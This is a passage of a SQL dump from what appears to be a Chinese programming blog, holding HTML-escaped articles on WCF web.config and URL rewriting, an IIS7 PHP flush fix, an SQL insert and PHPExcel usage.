style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;dns&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;value&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;localhost&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;identity&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;endpoint&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;endpoint&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;address&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;mex&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;binding&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;mexHttpBinding&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;contract&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;IMetadataExchange&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;service&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;services&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;behaviors&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;serviceBehaviors&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;behavior&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ServiceBehavior&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;为避免泄漏元数据信息，请在部署前将以下值设置为 false 并删除上面的元数据终结点 &lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;serviceMetadata&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;httpGetEnabled&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;true&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;要接收故障异常详细信息以进行调试，请将以下值设置为 true。在部署前设置为 false 以避免泄漏异常信息&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;serviceDebug&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;includeExceptionDetailInFaults&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;behavior&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;serviceBehaviors&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;behaviors&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;system.serviceModel&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;URL&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;重定向&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:19px&quot;&gt;rewriter&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;rewrite&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;url&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/user/u(.+).aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/user/index.aspx?r=$1&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;rewrite&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;url&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/ask/q(.+).aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/home/ask/content.aspx?id=$1&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;rewrite&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;url&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/blog/b(.+).aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/home/blog/article.aspx?r=$1&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;rewrite&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;url&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/news/n(.+).aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/home/news/content.aspx?nid=$1&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;rewrite&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;url&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/default.aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;~/home/ram/net.aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;rewriter&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;configuration&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考链接：&lt;/p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.cnblogs.com/gaoweipeng/archive/2009/05/17/1458762.html&quot;&gt;http://www.cnblogs.com/gaoweipeng/archive/2009/05/17/1458762.html&lt;/a&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386859496);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(83, 83, '&lt;p&gt;数据库连接配置中 &amp;nbsp;host不要用&amp;quot;localhost&amp;quot; 改为IP 127.0.0.1 &lt;/p&gt;', 1386859659),
(84, 84, '&lt;div id=&quot;article_content&quot; class=&quot;article_content&quot;&gt;&lt;h2 class=&quot;title content-title&quot;&gt;IIS7下,flush无效,解决方案&lt;/h2&gt;&lt;div id=&quot;content&quot; class=&quot;content mod-cs-content text-content clearfix&quot;&gt;&lt;p&gt;打开文件 C:WindowsSystem32inetsrvconfigapplicationHost.config ，注意如果你的是64位系统，这个文件就必须用64位的编辑软件打开，32位的软件打开会提示文件不存在，就用系统自带的notepad记事本打开就可以了。找到下面这一段，加入红色的那段代码就行了，也就是php这个handler里面加上responseBufferLimit=&amp;quot;0&amp;quot;。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&amp;lt;handlers accessPolicy=&amp;quot;Read, Script&amp;quot;&amp;gt;&lt;/p&gt;&lt;p&gt;&amp;lt;add name=&amp;quot;PHP_via_FastCGI&amp;quot; path=&amp;quot;*.php&amp;quot; verb=&amp;quot;*&amp;quot; modules=&amp;quot;FastCgiModule&amp;quot; scriptProcessor=&amp;quot;C:Program FilesPHPphp-cgi.exe&amp;quot; resourceType=&amp;quot;Either&amp;quot; responseBufferLimit=&amp;quot;0&amp;quot; /&amp;gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386859795),
(85, 85, '&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;insert into am_usertempdata select UserID as UserID, 0 as MonthWorkHours, 0 as MonthOverHours, 0 as ContinueWorkDays, 0 as LastDuty from am_user&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386859919),
(86, 86, '&lt;p&gt;PHPExcel是一款强大的处理EXCEL的开源项目&lt;/p&gt;&lt;p&gt;下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://www.codeplex.com/PHPExcel&quot;&gt;http://www.codeplex.com/PHPExcel&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;下面是总结的一些使用方法：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n//包含PHPExcel入口文件 \r\nrequire_once &#039;PHPExcel.php&#039;; \r\n//实例化PHPExcel对象 \r\n$objExcel = new PHPExcel(); \r\n             \r\n//创建写对象 excel07文件 xlsx \r\n$objWriter = PHPExcel_IOFactory::createWriter($objExcel, &#039;Excel2007&#039;); \r\n//旧Excel文件 xls \r\n$objWriter = PHPExcel_IOFactory::createWriter($objExcel, &#039;Excel5&#039;); \r\n             \r\n//保存excel文件 \r\n//$objWriter-&amp;gt;save(&quot;xxx.xlsx&quot;); \r\n             \r\n$outputFileName = &quot;xxx.xlsx&quot;; \r\n//输出到浏览器 \r\nheader(&quot;Content-Type: application/force-download&quot;); \r\nheader(&quot;Content-Type: application/octet-stream&quot;); \r\nheader(&quot;Content-Type: application/download&quot;); \r\nheader(&#039;Content-Disposition:inline;filename=&quot;&#039;.iconv(&#039;UTF-8&#039;, &#039;GB2312&#039;, $outputFileName).&#039;&quot;&#039;); \r\nheader(&quot;Content-Transfer-Encoding: binary&quot;); \r\nheader(&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;); \r\nheader(&quot;Last-Modified: &quot; . gmdate(&quot;D, d M Y H:i:s&quot;) . &quot; GMT&quot;); \r\nheader(&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot;); \r\nheader(&quot;Pragma: no-cache&quot;); \r\n$objWriter-&amp;gt;save(&quot;php://output&quot;); \r\nexit;&lt;/pre&gt;&lt;p&gt;设置Excel的属性&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;创建人&lt;br /&gt;　　$objPHPExcel-&amp;gt;getProperties()-&amp;gt;setCreator(&amp;quot;Maarten Balliauw&amp;quot;);&lt;br /&gt;　　最后修改人&lt;br /&gt;　　$objPHPExcel-&amp;gt;getProperties()-&amp;gt;setLastModifiedBy(&amp;quot;Maarten Balliauw&amp;quot;);&lt;br /&gt;　　标题&lt;br /&gt;　　$objPHPExcel-&amp;gt;getProperties()-&amp;gt;setTitle(&amp;quot;Office 2007 XLSX Test Document&amp;quot;);&lt;br /&gt;　　题目&lt;br /&gt;　　$objPHPExcel-&amp;gt;getProperties()-&amp;gt;setSubject(&amp;quot;Office 2007 XLSX Test Document&amp;quot;);&lt;br /&gt;　　描述&lt;br /&gt;　　$objPHPExcel-&amp;gt;getProperties()-&amp;gt;setDescription(&amp;quot;Test document for Office 2007 XLSX, generated using PHP classes.&amp;quot;);&lt;br /&gt;　　关键字&lt;br /&gt;　　$objPHPExcel-&amp;gt;getProperties()-&amp;gt;setKeywords(&amp;quot;office 2007 openxml php&amp;quot;);&lt;br /&gt;　　种类&lt;br /&gt;　　$objPHPExcel-&amp;gt;getProperties()-&amp;gt;setCategory(&amp;quot;Test result file&amp;quot;);&lt;br /&gt;　　&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&lt;br /&gt;&lt;br /&gt;设置当前的sheet&lt;br /&gt;　　$objPHPExcel-&amp;gt;setActiveSheetIndex(0);&lt;br /&gt;　　设置sheet的name&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;setTitle(&amp;#39;Simple&amp;#39;);&lt;br /&gt;　　设置单元格的值&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;setCellValue(&amp;#39;A1&amp;#39;, &lsquo;String&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;setCellValue(&amp;#39;A2&amp;#39;, 12);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;setCellValue(&amp;#39;A3&amp;#39;, true);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;setCellValue(&amp;#39;C5&amp;#39;, &lsquo;=SUM(C2:C4)&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;setCellValue(&amp;#39;B8&amp;#39;, &lsquo;=MIN(B2:C5)&amp;#39;);&lt;br /&gt;　　合并单元格&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;mergeCells(&amp;#39;A18:E22&amp;#39;);&lt;br /&gt;　　分离单元格&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;unmergeCells(&amp;#39;A28:B28&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;保护cell&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getProtection()-&amp;gt;setSheet(true); // Needs to be set to true in order to enable any worksheet protection!&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;protectCells(&amp;#39;A3:E13&amp;#39;, &lsquo;PHPExcel&amp;#39;);&lt;br /&gt;&lt;br /&gt;设置格式&lt;br /&gt;　　// Set cell number formats&lt;br /&gt;　　echo date(&amp;#39;H:i:s&amp;#39;) . &amp;quot; Set cell number formatsn&amp;quot;;&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E4&amp;#39;)-&amp;gt;getNumberFormat()-&amp;gt;setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_CURRENCY_EUR_SIMPLE);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;duplicateStyle( $objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E4&amp;#39;), &lsquo;E5:E13&amp;#39; );&lt;br /&gt;&lt;br /&gt;设置宽width&lt;br /&gt;　　// Set column widths&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getColumnDimension(&amp;#39;B&amp;#39;)-&amp;gt;setAutoSize(true);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getColumnDimension(&amp;#39;D&amp;#39;)-&amp;gt;setWidth(12);&lt;br /&gt;&lt;br /&gt;设置font&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B1&amp;#39;)-&amp;gt;getFont()-&amp;gt;setName(&amp;#39;Candara&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B1&amp;#39;)-&amp;gt;getFont()-&amp;gt;setSize(20);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B1&amp;#39;)-&amp;gt;getFont()-&amp;gt;setBold(true);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B1&amp;#39;)-&amp;gt;getFont()-&amp;gt;setUnderline(PHPExcel_Style_Font::UNDERLINE_SINGLE);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B1&amp;#39;)-&amp;gt;getFont()-&amp;gt;getColor()-&amp;gt;setARGB(PHPExcel_Style_Color::COLOR_WHITE);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E1&amp;#39;)-&amp;gt;getFont()-&amp;gt;getColor()-&amp;gt;setARGB(PHPExcel_Style_Color::COLOR_WHITE);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D13&amp;#39;)-&amp;gt;getFont()-&amp;gt;setBold(true);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E13&amp;#39;)-&amp;gt;getFont()-&amp;gt;setBold(true);&lt;br /&gt;&lt;br /&gt;设置align&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D11&amp;#39;)-&amp;gt;getAlignment()-&amp;gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_RIGHT);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D12&amp;#39;)-&amp;gt;getAlignment()-&amp;gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_RIGHT);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D13&amp;#39;)-&amp;gt;getAlignment()-&amp;gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_RIGHT);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;A18&amp;#39;)-&amp;gt;getAlignment()-&amp;gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_JUSTIFY);&lt;br /&gt;&lt;br /&gt;//垂直居中&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;A18&amp;#39;)-&amp;gt;getAlignment()-&amp;gt;setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);&lt;br /&gt;&lt;br /&gt;设置column的border&lt;br /&gt;　　